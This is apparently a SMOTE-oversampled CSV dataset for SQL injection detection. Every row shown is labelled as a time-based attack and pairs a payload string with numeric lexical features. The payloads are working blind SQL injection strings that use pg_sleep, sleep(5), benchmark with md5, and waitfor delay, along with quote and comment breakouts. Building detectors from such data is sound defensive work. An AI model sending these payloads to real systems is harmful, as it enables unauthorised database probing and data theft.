id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000361,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.9776950290632597,34.86699016539579,16.37766994486807,3.3702102284928794,13.0,0.0,11.866990165395787,10.0,0.3735093668769821,0.0,0.3391757355253393,0.2873148975976786,0.0,0.37766994486807115,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.622330055131929,0.0,5.0,0.0,2.0,0.0,0.37766994486807115,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000362,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000449,0.2641833456223546,71.26313831882571,26.0,3.684083187272182,16.0,21.0,26.610510655060573,7.652627663765143,0.22477634707872451,0.29501895554082597,0.3729249405504234,0.10727975683002614,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.652627663765143,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000363,attack,time,"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",nearest_attack_euclidean,R000531,1.4134635249516179,102.1766966555301,25.454886889631325,3.418430167475058,18.0,29.545113110368675,44.541357324424084,10.090226220737346,0.1771246789186471,0.29036857596762466,0.433942330234796,0.09856441487893224,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,7.090226220737347,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.5451131103686733,0.4548868896313266,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000364,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000770,0.2885806173320049,97.51571121067471,25.89517869955522,3.4670118683185676,31.0,10.0,43.09642600889559,13.419285201779118,0.3194173332568849,0.1030378494377048,0.44007220797942664,0.13747260932598365,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,6.419285201779118,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000365,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000582,0.5035037244002206,84.76474036960535,21.764740369605352,2.990326382885143,28.0,2.0,43.0,11.764740369605352,0.3303343514917437,0.023595310820838822,0.507299182648035,0.13877115503938245,0.764740369605353,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,0.764740369605353,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000366,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",nearest_attack_euclidean,R000268,0.3456832677855926,58.23285149377683,21.147262375518597,3.7749983378805654,27.0,3.0,18.527376244814022,9.705475248962804,0.46656701724584226,0.05184077969398247,0.3149255363935086,0.16666666666666666,2.0,3.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.7054752489628044,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000367,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000581,0.3137250817667548,68.96457530147447,25.0,3.5963264783566395,15.0,21.0,26.371660241179573,6.592915060294892,0.2177830496111573,0.3048962694556202,0.381856544746578,0.0954641361866445,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.592915060294892,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000368,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.3343299690770705,79.743773017085,28.74377301708501,4.003729679427924,29.97509206834004,15.0,25.51245396582998,9.25622698291499,0.3756330772335846,0.18811593024739182,0.3200964730511656,0.11615451946785804,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.128113491457495,0.12811349145749523,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000369,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,0.5603850718153436,77.76349937243289,23.0,3.2149798039015915,19.0,10.0,37.511117130238844,11.252382242194038,0.24680928929151505,0.12989962594290266,0.4789133452926524,0.14437773947292992,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.252382242194039,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000370,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,0.8943396452341958,120.58270761379676,28.52756920459892,3.3202688526586153,24.110276818395675,21.0,58.0,17.47243079540108,0.19942788113945425,0.17423425241027898,0.48121841141886573,0.145119455031401,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,10.0,0.47243079540108135,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000371,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000350,0.2030572144929157,83.6902045109824,21.20653032601173,2.964551571601672,28.20653032601173,2.0,42.58693934797654,10.896734836994135,0.3371579690002172,0.023900586563497223,0.5087630968926786,0.13017834754360683,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.896734836994135,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8967348369941348,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.896734836994135
SMOTE_000372,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,0.17331034169467252,56.36165848569307,20.216995091415843,3.2718963848324325,16.289326788554458,9.072331697138615,25.0,6.0,0.28876339706907506,0.1609472039427766,0.443781773377539,0.10650762561060935,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.07233169713861465,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0723316971386145
SMOTE_000373,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.6635968566226161,82.30987590623435,20.30987590623435,2.9476413441733986,28.0,2.0,42.0,10.30987590623435,0.34018857987443996,0.02429918427674571,0.5102828698116599,0.12522936603715445,0.30987590623435013,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.0,0.30987590623435024,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000374,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.104511581448302,23.241560301537987,17.0,3.9976551801689304,11.999999999999998,3.161040201025327,2.0805201005126612,6.0,0.5168917665243212,0.1354167955166698,0.0892455546968483,0.2584458832621606,2.0,0.0,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000375,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.03315918021193259,27.027736880110467,15.013868440055234,3.3284272274364426,11.0,0.0,9.013868440055234,7.0138684400552345,0.407017744979291,0.0,0.33349274069029,0.25948951433041895,0.0,0.013868440055234466,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,4.000000000000001,0.0,0.0,0.0,0.013868440055234466,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000376,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000760,1.02852018110705,82.74226736361044,27.90309305455583,3.7863547303609364,26.612372218223307,15.0,30.48453472722087,10.645360418166259,0.32337933664499136,0.1814508808155652,0.366942072659913,0.12822770987953042,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.096906945444173,0.5484534727220867,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000377,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.0203381940218796,43.299458708420794,16.43315290280693,3.0732761542034255,13.0,0.0,18.86630580561386,11.43315290280693,0.300585733751603,0.0,0.43544687147312583,0.2639673947752711,0.0,0.43315290280692925,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.0,0.0,5.0,0.0,2.0,0.0,0.4331529028069293,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000378,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.017590963354688238,50.0,24.062265039768963,4.071625316196288,17.0,12.0,13.0,8.0,0.34,0.24,0.26,0.16,2.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000379,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,0.2704178452113064,62.97294273953987,20.0,2.9903697971783574,10.0,10.0,32.26252234817703,10.710420391362838,0.15922296355559717,0.15922296355559717,0.5114015648507033,0.1701525080381024,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.710420391362838,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000380,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",nearest_attack_euclidean,R000517,1.2696971734985973,111.09000816539645,25.687825376922046,3.285190530178538,32.3756507538441,10.0,53.43392085385749,15.280436557694884,0.2962983356600277,0.09095762590564035,0.4760281935854216,0.13671584484891028,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.6560873115389767,0.0,8.624349246155905,0.0,1.0,0.0,1.6560873115389765,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000381,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.21785998826681183,44.826632424040355,16.0,2.8062456631993835,11.0,0.0,23.022193686700298,10.80443873734006,0.24738302003552176,0.0,0.5109857617718959,0.24163121819258235,0.0,2.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.8044387373400603,0.0,4.000000000000001,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000382,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,1.5841038583567095,52.391451053896475,22.608548946103525,3.7498680162830014,18.710536143723928,7.825646838310581,17.46381701796549,8.391451053896473,0.3552525699061268,0.15192831376437252,0.3333333333333333,0.15948578299616734,3.391451053896473,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000383,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.9528349809856322,88.55366660486132,27.553666604861327,3.852681658373454,20.0,29.0,30.0,9.553666604861327,0.22585886975265237,0.327495361141346,0.3387883046289786,0.10785746447702309,0.5536666048613268,0.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.5536666048613268,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000384,attack,time,1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000417,0.8718406390685325,101.75989023574631,30.74670325475123,3.858487715647827,32.50659349049754,18.0,38.37335162737561,12.87994511787316,0.3191571286299421,0.17703316088663326,0.3775463834663171,0.12626332701710755,2.2532967452487727,0.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.0,0.0,1.0,0.0,4.626648372624386,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.626648372624386,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.626648372624386
SMOTE_000385,attack,time,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,nearest_attack_euclidean,R000220,0.13021635487799657,63.37976437609225,27.810117811953877,3.9236439226221873,23.075952875218448,10.0,21.22785862565535,9.07595287521845,0.36422058066724083,0.15790440448773158,0.3347206004606109,0.14315441438441662,3.037976437609225,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.037976437609225,0.0,0.0,0.0,2.037976437609225,1.0,0.0,0.0,0.9620235623907752,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.9620235623907754,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.962023562390775
SMOTE_000386,attack,time,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000630,1.7313308862428607,113.1341305605266,31.378043520175535,3.947229836361562,39.20119584078991,18.0,40.31097823991223,15.621956479824465,0.34579210515745684,0.15920108894379906,0.35663320902822837,0.1383735968705157,3.3109782399122327,0.0,1.3780435201755348,0.0,-2.7755575615628914e-17,2.0,0.0,5.310978239912233,0.0,0.6890217600877674,0.31097823991223267,6.0,1.0,0.0,0.6890217600877674,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.6890217600877673,0.0,1.0,1.6890217600877675,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3109782399122326,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.689021760087767
SMOTE_000387,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,0.2340206444421342,52.493703188318655,23.40251872467254,3.7360988337280467,15.0,11.70125936233627,18.493703188318655,7.298740637663731,0.28627256728824235,0.22368339958659866,0.35111551414665065,0.1389285189785083,2.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.298740637663731,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000388,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,nearest_attack_euclidean,R000197,0.709097158895621,101.06775109224989,25.689250364083293,3.4123596758118446,40.06775109224988,2.0,45.0,14.0,0.39632925496407634,0.019792483443800774,0.4453308774855174,0.13854738410660544,4.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.3107496359167057,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.3107496359167055
SMOTE_000389,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000404,0.9930980390894898,87.63763745122276,27.297046814028445,3.686220182565165,24.253502990862575,20.318818725611376,33.38413446036018,9.681181274388623,0.2755727584339104,0.23172299803089685,0.38194596245659623,0.1107582810785965,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.6811812743886225,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000390,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000497,1.2063204601733628,67.54074759658408,26.0,3.733332401550558,15.0,21.540747596584076,24.0,7.0,0.22210026032731317,0.3188925349962396,0.3553604165237011,0.10364678815274614,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.5407475965840783,0.4592524034159217,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000391,attack,time,"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000208,0.859438540083844,60.83981005838936,20.0,3.055622268595957,10.69336499026844,10.0,29.839810058389364,10.306635009731561,0.1764460557453859,0.16469410675778523,0.4894482690508658,0.16941156844596308,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.30663500973156,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6933649902684393,0.30663500973156066,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000392,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.37445865658771,98.14278209538172,32.0,3.8310040713351334,30.14278209538172,18.0,39.0,11.0,0.30712318928942045,0.1834085675410358,0.39738522967224416,0.11208301349729963,1.0,0.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.0,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.1427820953817207,0.8572179046182793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
